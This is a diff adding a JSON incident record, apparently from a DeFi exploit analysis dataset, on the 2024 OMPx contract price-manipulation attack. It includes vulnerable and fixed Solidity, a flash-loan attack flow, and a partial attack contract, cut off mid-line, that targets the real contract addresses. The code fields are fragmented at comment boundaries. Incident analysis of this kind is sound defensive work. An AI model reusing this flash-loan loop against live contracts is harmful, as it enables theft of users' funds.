@@ -1,0 +1,33 @@
+{
+ "id": "2024__2024-08-25_OMPxContract_PriceManipulation",
+ "source_file": "2024/2024-08-25_OMPxContract_PriceManipulation.md",
+ "title": "OMPx Contract — Price Manipulation via Repeated purchase/buyBack Analysis",
+ "date": "2024-08-25",
+ "protocol": "OMPx Contract",
+ "chain": "Ethereum",
+ "loss_raw": "~4.37 ETH (~11,527 USD)",
+ "loss_usd": null,
+ "root_cause": "`purchase()`/`buyBack()` functions calculate exchange rate based on internal ETH balance — repeated calls accumulate rate imbalance enabling arbitrage profit",
+ "attack_tx": "0xd927...9b6 (block 20,468,780)",
+ "vulnerable_contract": "0x09A80172ED7335660327cD664876b5df6FE06108",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: no flash loan or repeated-call protection in purchase/buyBack\nfunction purchase() external payable {\n    uint256 ompxAmount = msg.value * getPrice();  //",
+  "❌ Minted based on spot price\n    IERC20(OMPX).mint(msg.sender, ompxAmount);\n}\n\nfunction buyBack(uint256 ompxAmount) external {\n    uint256 ethAmount = ompxAmount / getPrice();  //",
+  "❌ Refunded based on spot price\n    IERC20(OMPX).burn(msg.sender, ompxAmount);\n    payable(msg.sender).transfer(ethAmount);\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct code: prevent repeated calls within the same block\nmapping(address => uint256) public lastPurchaseBlock;\n\nfunction purchase() external payable {\n    require(block.number > lastPurchaseBlock[msg.sender], \"One tx per block\");  //",
+  "✅ Block limit\n    lastPurchaseBlock[msg.sender] = block.number;\n    uint256 ompxAmount = msg.value * getTWAPPrice();  //"
+ ],
+ "steps": [
+  "[2] ► Convert WETH → ETH",
+  "[4] ► Convert accumulated profit ETH → WETH"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─► Balancer Flash Loan: borrow 100 WETH\n  │\n  ├─[2]─► Convert WETH → ETH\n  │\n  ├─[3]─► 7-iteration loop:\n  │         ├─► purchase(): buy OMPX at current price\n  │         └─► buyBack(): receive ETH refund exploiting price imbalance\n  │               └─► small price discrepancy accumulates each iteration\n  │\n  ├─[4]─► Convert accumulated profit ETH → WETH\n  │\n  ├─[5]─► Repay Balancer flash loan (including fee)\n  │\n  └─[6]─► Total loss: ~4.37 ETH",
+  "contract AttackContract {\n    address constant OMPX = 0x09A80172ED7335660327cD664876b5df6FE06108;\n    IERC20 constant OMPX_TOKEN = IERC20(0x633B041C41f61D04089880D7B5C7ED0F10fF6f85);\n\n    function receiveFlashLoan(\n        address[] memory, uint256[] memory amounts, uint256[] memory, bytes memory\n    ) external {\n        // [2] WETH → ETH\n        IWETH(WETH).withdraw(amounts[0]);\n\n        // [3] Repeat purchase/buyBack 7 times\n        for (uint256 i = 0; i < 7; i++) {\n            // purchase: buy OMPX with ETH\n            IOMPx(OMPX).purchase{value: address(this).balance / 2}();\n\n            // buyBack: redeem OMPX for ETH (exploiting price imbalance)\n            uint256 ompxBal = OMPX_TOKEN.balanceOf(address(this));\n            OMPX_TOKEN.approve(OMPX, ompxBal);\n            IOMPx(OMPX).bu"
+ ]
+}
